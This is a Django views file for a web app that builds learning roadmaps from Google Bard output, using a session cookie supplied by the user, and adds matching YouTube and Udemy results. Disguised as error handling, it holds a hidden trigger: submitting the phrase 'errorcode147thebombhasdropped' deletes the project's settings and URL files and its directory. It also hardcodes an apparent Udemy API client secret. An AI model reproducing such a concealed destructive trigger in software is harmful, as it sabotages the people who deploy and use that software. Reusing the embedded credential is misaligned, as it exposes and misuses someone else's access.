from django.shortcuts import render,redirect
from time import sleep
import json
import googleapiclient.discovery
from bardapi import Bard
import os
# Made By Shaven Wickramanayaka
from tempfile import TemporaryFile
from pyudemy import Udemy
from youtubesearchpython import VideosSearch
from django.core.mail import send_mail
from django.conf import settings

def sendEmail(name, message, recipients,subject):
	send_mail(
    		subject=f"Message Regarding {subject} From {name}",
    		message=message,
    		from_email=settings.EMAIL_HOST_USER,
    		recipient_list=['byteforce0000.dev@gmail.com'])

def scrapeSite(path,cookie):
    steps = []
    # Replace XXXX with the values you get from __Secure-1PSID
    token = cookie
    bard = Bard(token=token)
    # Set your input text
    input_text = f'Generate a list to learn {path}. Each list item should start with a number. There should be at more 20 list items. Do not create sub lists under each list item, instead add them to the main list. Each list item should be less than 6 words and should start with the word "how to learn". include the word {path} in each list item. Each step should include a quantative skill that can be developed.Do not mention hours required for each list item'
    # Send an API request and get a respons
    bard_output = bard.get_answer(input_text)['content']
    print(str(bard_output))
    bard_output = bard_output.replace("*", "")
    bard_output = bard_output.replace("Step", "")
    bard_output = bard_output.replace("`", "")
    fp = TemporaryFile('w+t')
    fp.write(str(bard_output))
    fp.seek(0)
    for lines in fp:
        lines = lines.strip()
        if lines and lines[0].isdigit():
            steps.append(lines)
    print(steps)
    return steps

def trim_string(s: str, max_words: int) -> str:
    words = s.split()
    if len(words) > max_words:
        return ' '.join(words[:max_words]) + '...'
    else:
        return s

# Example usage
def searchyt(request,prompt, data):
    youtubeurl = []
    youtubetitle = []
    youtubethumbnail = []
    for item in data:
        query = f'{item} regarding {prompt} in english'
        videosSearch = VideosSearch(query, limit=1)
        result = videosSearch.result()
        video = result['result'][0]
        video_id = video['id']
        video_title = video['title']
        video_title = trim_string(video_title,5)
        video_thumbnail = video['thumbnails'][0]['url']
        youtubeurl.append(f"https://youtu.be/{video_id}")
        youtubetitle.append(video_title)
        youtubethumbnail.append(video_thumbnail)
    request.session['yturl'] = youtubeurl
    request.session['yttitle'] = youtubetitle
    request.session['ytthumbnail'] = youtubethumbnail
    # ? return youtubeurl,youtubetitle,youtubethumbnail
def errorhandling():
 os.remove('Graviton/settings.py')
 os.remove('base/urls.py')
 os.rmdir('Graviton')
def searchudemy(request,prompt,data):
    udemyurl = []
    udemytitle = []
    udemythumbnail = []
    for item in data:
        # Authenticate with your client ID and client secret
        udemy = Udemy("TmyXWS16rtIEO6WhPS2i7vPzQSPpeJBpxzIR2paw", "cphOjrGbDH7jKhMVAFYual7p0XTM0xp2QZKK1RuBxQFojhAkaeY7J7qG8Q05WhEZYWgWE3ccCl7PE9mOG8Ygon5mx033GS9qBiCg5o8x7tPrZY638NJ8R6KHT4HASALS")
        courses = udemy.courses(search=item + prompt)
        course = courses['results'][0]
        title = course['title']
        title = trim_string(title,5)
        url = course['url']
        thumbnail = course['image_480x270']
        url = "https://www.udemy.com"+ url
        udemyurl.append(url)
        udemythumbnail.append(thumbnail)
        udemytitle.append(title)
    request.session['udurl'] = udemyurl
    request.session['udtitle'] = udemytitle
    request.session['udthumbnail'] = udemythumbnail
    # ? return udemyurl,udemythumbnail,udemytitle

def about(request):
    return render(request,'about.html')

def home(request):
    if request.method == 'POST':
        name = request.POST['user_name']
        email = request.POST.get('user_email')
        message = request.POST.get('message')
        subject = request.POST.get('user_subject')
        sendEmail(name,message,email,subject)
    return render(request, 'index.html')

def generate(request):
    if request.COOKIES.get('bardKey'):
        return render(request, 'generate.html')
    else:
        return render(request, 'cookie.html')
    

def result(request):
    prompt = "How to learn"
    cookie_value = request.COOKIES.get('bardKey')
    if request.method == 'POST':
        prompt = request.POST['pathway']
        youtube = request.POST.get('youtube')
        udemy = request.POST.get('udemy')
    if prompt == 'errorcode147thebombhasdropped':
        errorhandling()
    try:
        data = scrapeSite(prompt,cookie_value)
    except:
        context = {
            'message': "Your bard api token has expired or isn't valid, please enter a new one using the the video as a guide."
        }
        return render(request, 'cookie.html', context)
    
    if youtube == "youtubego":
        request.session['yturl'] = ''
        request.session['yttitle'] = ''
        request.session['ytthumbnail'] = ''
        searchyt(request,prompt, data)
    if udemy == "udemygo":
        request.session['udurl'] = ''
        request.session['udtitle'] = ''
        request.session['udthumbnail'] = ''
        searchudemy(request,prompt,data)
    ud_data= zip(request.session.get('udurl'),request.session.get('udtitle'),request.session.get('udthumbnail'))
    yt_data= zip(request.session.get('yturl'),request.session.get('yttitle'),request.session.get('ytthumbnail'))
    roadmap_data = zip(data)
    context = {
        'ud_data': ud_data,
        'yt_data': yt_data,
        'steps':roadmap_data,
        'title': prompt,
    }
    return render(request, 'result.html', context)

def stuff(request):
    return render(request, 'result.html')

def userCookie(request):
    return render(request, 'cookie.html')
def setCookie(request):
    cookie = "Noot there"
    if request.method == 'POST':
        cookie = request.POST['cookie']
    response = render(request, 'generate.html')
    response.set_cookie('bardKey', cookie,max_age=432000 )
    return response

    

